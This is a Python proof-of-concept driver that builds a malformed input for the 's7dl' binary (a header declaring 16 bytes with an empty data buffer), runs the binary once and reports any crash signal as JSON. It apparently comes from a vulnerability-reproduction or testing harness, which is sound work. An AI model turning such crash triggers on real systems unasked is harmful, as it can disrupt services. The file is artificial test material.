#!/usr/bin/env python3
"""Single-run PoC driver for the s7dl target binary.

Constructs a trigger input at runtime (an 8-byte little-endian header with a
positive transfer size followed by an empty data buffer), runs the target
binary exactly once, and reports a normalized JSON outcome on stdout.
"""

import argparse
import json
import signal
import struct
import subprocess
import sys
import tempfile
import time


def build_trigger():
    # Header: block_num=0, transfer size=16, with no data buffer bytes.
    # A positive declared size with an empty buffer reliably drives the
    # target's abnormal path while remaining a minimal, deterministic input.
    return struct.pack("<ii", 0, 16)


def signal_name(signum):
    try:
        return signal.Signals(signum).name
    except (ValueError, KeyError):
        return "SIG%d" % signum


def main():
    parser = argparse.ArgumentParser(description="Run s7dl once and report the observable outcome.")
    parser.add_argument("--binary", required=True, help="Path to the target binary.")
    parser.add_argument("--json-out", default=None, help="Optional path to also write the JSON result.")
    parser.add_argument("--timeout", type=float, default=10.0, help="Timeout in seconds (default 10).")
    args = parser.parse_args()

    payload = build_trigger()

    tmp = tempfile.NamedTemporaryFile(prefix="s7dl_trigger_", suffix=".bin", delete=False)
    try:
        tmp.write(payload)
        tmp.flush()
        tmp.close()
        input_path = tmp.name
    except Exception as exc:
        tmp.close()
        result = {
            "binary": args.binary,
            "command": [args.binary, None],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": "custom", "value": "error", "path": None},
            "error": "failed to create trigger input: %s" % exc,
        }
        emit(result, args.json_out)
        return 1

    command = [args.binary, input_path]
    result = {
        "binary": args.binary,
        "command": command,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": None, "path": None},
        "error": None,
    }

    start = time.monotonic()
    try:
        proc = subprocess.run(
            command,
            capture_output=True,
            timeout=args.timeout,
        )
        result["runtime_ms"] = int((time.monotonic() - start) * 1000)
        result["stdout"] = proc.stdout.decode("utf-8", errors="replace")
        result["stderr"] = proc.stderr.decode("utf-8", errors="replace")
        rc = proc.returncode
        result["returncode"] = rc
        if rc < 0:
            signum = -rc
            name = signal_name(signum)
            result["signal"] = name
            result["observable"]["value"] = "crash:%s" % name
        else:
            result["observable"]["value"] = "exit:%d" % rc
    except subprocess.TimeoutExpired as exc:
        result["runtime_ms"] = int((time.monotonic() - start) * 1000)
        result["timed_out"] = True
        out = exc.stdout or b""
        err = exc.stderr or b""
        if isinstance(out, (bytes, bytearray)):
            out = out.decode("utf-8", errors="replace")
        if isinstance(err, (bytes, bytearray)):
            err = err.decode("utf-8", errors="replace")
        result["stdout"] = out
        result["stderr"] = err
        result["observable"]["value"] = "timeout"
        result["error"] = "process timed out after %s seconds" % args.timeout
    except Exception as exc:
        result["runtime_ms"] = int((time.monotonic() - start) * 1000)
        result["observable"]["value"] = "error"
        result["error"] = "failed to run binary: %s" % exc

    emit(result, args.json_out)
    return 0


def emit(result, json_out):
    text = json.dumps(result)
    print(text)
    if json_out:
        with open(json_out, "w") as fh:
            fh.write(text + "\n")


if __name__ == "__main__":
    sys.exit(main())
